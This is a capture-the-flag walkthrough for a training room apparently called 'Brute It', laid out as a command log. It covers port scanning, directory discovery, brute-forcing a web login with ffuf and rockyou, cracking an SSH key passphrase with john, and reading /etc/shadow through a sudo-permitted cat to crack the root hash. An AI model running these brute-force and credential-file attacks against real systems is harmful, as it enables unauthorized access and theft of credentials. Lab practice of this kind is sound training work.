# https://tryhackme.com/room/bruteit

```bash
=================================
10.201.45.30 -- domain.com -- win/lin x32/x64
=================================
vpn-connect
echo 'export TARGET=10.201.45.30' >> ~/.zshrc && source ~/.zshrc

sudo nmap -n -Pn -sS -A -T4 -oA nmap_scan -p- $TARGET
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
|   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
|_  256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works

feroxbuster -t 64 -o feroxbuster_dir_common --depth 2 -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://$TARGET
403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       15l       74w     6147c http://10.201.45.30/icons/ubuntu-logo.png
301      GET        9l       28w      312c http://10.201.45.30/admin => http://10.201.45.30/admin/
200      GET      375l      964w    10918c http://10.201.45.30/
200      GET      375l      964w    10918c http://10.201.45.30/index.html
200      GET       78l      130w     1262c http://10.201.45.30/admin/styles.css
200      GET       28l       52w      671c http://10.201.45.30/admin/index.php
301      GET        9l       28w      318c http://10.201.45.30/admin/panel => http://10.201.45.30/admin/panel/
[####################] - 17s     9504/9504    0s      found:7       errors:1
[####################] - 14s     4747/4747    331/s   http://10.201.45.30/
[####################] - 11s     4747/4747    439/s   http://10.201.45.30/admin/

# http://$TARGET/admin/

// <!-- Hey john, if you do not remember, the username is admin -->

---

curl -L -o baseline.html http://$TARGET/admin/
curl 'http://10.201.45.30/admin/' --compressed -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://10.201.45.30' -H 'Connection: keep-alive' -H 'Referer: http://10.201.45.30/admin/' -H 'Cookie: PHPSESSID=cdd4t9u7cgu89h3fs2ev453q31' -H 'Upgrade-Insecure-Requests: 1' -H 'Priority: u=0, i' --data-raw 'user=admin&pass=badpassword' -o failed_login.html
diff baseline.html failed_login.html
// >             <p>Username or password invalid</p>
// >
// >

# take headers from curl command
# -fs 733 => the size of failure
ffuf -s -t 64 -r -w /usr/share/wordlists/rockyou.txt:FUZZ -X POST -d "user=admin&pass=FUZZ" -H "Accept-Encoding: identity" -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://10.201.45.30' -H 'Connection: keep-alive' -H 'Referer: http://10.201.45.30/admin/' -H 'Cookie: PHPSESSID=cdd4t9u7cgu89h3fs2ev453q31' -H 'Upgrade-Insecure-Requests: 1' -H 'Priority: u=0, i' -u http://$TARGET/admin/ -fs 733
xavier

# http://10.201.45.30/admin/panel/
Hello john, finish the development of the site, heres your RSA private key.
// john
// downloaded id_rsa

ssh2john target_id_rsa > john_target_id_rsa.txt
john --wordlist=/usr/share/wordlists/rockyou.txt john_target_id_rsa.txt
// rockinroll       (target_id_rsa)

ssh -i target_id_rsa john@$TARGET
// rockinroll

cat user.txt

sudo -l
// Matching Defaults entries for john on bruteit:
//     env_reset, mail_badpass,
//     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
// User john may run the following commands on bruteit:
//     (root) NOPASSWD: /bin/cat

sudo cat /etc/shadow
// root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
john --wordlist=/usr/share/wordlists/rockyou.txt root_hashes.txt
football         (root)

cat /root/root.txt
```